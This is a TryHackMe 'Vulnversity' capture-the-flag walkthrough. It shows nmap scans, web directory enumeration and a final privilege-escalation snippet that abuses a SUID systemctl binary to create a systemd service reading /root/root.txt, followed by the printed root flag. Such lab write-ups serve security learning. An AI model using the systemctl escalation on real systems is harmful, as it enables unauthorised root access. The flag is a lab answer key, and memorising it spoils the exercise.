# Vulnversity TryHackMe Walkthrough

## All Ports Scan

```bash
# Nmap 7.91 scan initiated Mon Jun 21 17:30:18 2021 as: nmap -T4 -sT -vv -p- -oA nmap/allports 10.10.245.127
Increasing send delay for 10.10.245.127 from 5 to 10 due to 11 out of 20 dropped probes since last increase.
Warning: 10.10.245.127 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.245.127
Host is up, received echo-reply ttl 63 (0.15s latency).
Scanned at 2021-06-21 17:30:19 EDT for 895s
Not shown: 65519 closed ports
Reason: 65519 conn-refused
PORT      STATE    SERVICE      REASON
21/tcp    open     ftp          syn-ack
22/tcp    open     ssh          syn-ack
139/tcp   open     netbios-ssn  syn-ack
445/tcp   open     microsoft-ds syn-ack
3128/tcp  open     squid-http   syn-ack
3333/tcp  open     dec-notes    syn-ack

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Jun 21 17:45:14 2021 -- 1 IP address (1 host up) scanned in 895.99 seconds
```



## Complete Scan

```bash
# Nmap 7.91 scan initiated Mon Jun 21 17:46:55 2021 as: nmap -T4 -sT -sV -sC -A -vv -p21,22,139,445,3128,3333 -oA nmap/complete 10.10.245.127
Nmap scan report for 10.10.245.127
Host is up, received echo-reply ttl 63 (0.21s latency).
Scanned at 2021-06-21 17:46:56 EDT for 38s

PORT     STATE SERVICE     REASON  VERSION
21/tcp   open  ftp         syn-ack vsftpd 3.0.3
22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYQExoU9R0VCGoQW6bOwg0U7ILtmfBQ3x/rdK8uuSM/fEH80hgG81Xpqu52siXQXOn1hpppYs7rpZN+KdwAYYDmnxSPVwkj2yXT9hJ/fFAmge3vk0Gt5Kd8q3CdcLjgMcc8V4b8v6UpYemIgWFOkYTzji7ZPrTNlo4HbDgY5/F9evC9VaWgfnyiasyAT6aio4hecn0Sg1Ag35NTGnbgrMmDqk6hfxIBqjqyYLPgJ4V1QrqeqMrvyc6k1/XgsR7dlugmqXyICiXu03zz7lNUf6vuWT707yDi9wEdLE6Hmah78f+xDYUP7iNA0raxi2H++XQjktPqjKGQzJHemtPY5bn
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHCK2yd1f39AlLoIZFsvpSlRlzyO1wjBoVy8NvMp4/6Db2TJNwcUNNFjYQRd5EhxNnP+oLvOTofBlF/n0ms6SwE=
|   256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqh93OTpuL32KRVEn9zL/Ybk+5mAsT/81axilYUUvUB
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  syn-ack Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%), Android 7.1.1 - 7.1.2 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=6/21%OT=21%CT=%CU=35111%PV=Y%DS=2%DC=T%G=N%TM=60D108F6%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=2%ISR=106%TI=Z%CI=I%II=I%TS=8)
OPS(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.014 days (since Mon Jun 21 17:27:48 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -8h10m00s, deviation: 2h18m34s, median: -9h30m01s
| nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   VULNUNIVERSITY<00>   Flags: <unique><active>
|   VULNUNIVERSITY<03>   Flags: <unique><active>
|   VULNUNIVERSITY<20>   Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 33703/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 54723/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 38761/udp): CLEAN (Failed to receive data)
|   Check 4 (port 60553/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2021-06-21T08:17:27-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-21T12:17:27
|_  start_date: N/A

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   162.07 ms 10.8.0.1
2   162.20 ms 10.10.245.127

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 21 17:47:34 2021 -- 1 IP address (1 host up) scanned in 39.27 seconds
```

## Port 3333 Enumeration

![](Images/Pasted%20image%2020210621180138.png)

```bash
/images               (Status: 301) [Size: 322] [--> http://10.10.245.127:3333/images/]
/css                  (Status: 301) [Size: 319] [--> http://10.10.245.127:3333/css/]
/js                   (Status: 301) [Size: 318] [--> http://10.10.245.127:3333/js/]
/fonts                (Status: 301) [Size: 321] [--> http://10.10.245.127:3333/fonts/]
/internal             (Status: 301) [Size: 324] [--> http://10.10.245.127:3333/internal/]
```

![](Images/Pasted%20image%2020210621180222.png)

![](Images/Pasted%20image%2020210621180358.png)

![](Images/Pasted%20image%2020210621180414.png)


## Priv Esec

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```


```bash
Flag : a58ff8579f0a9270368d33a9966c7fd5
```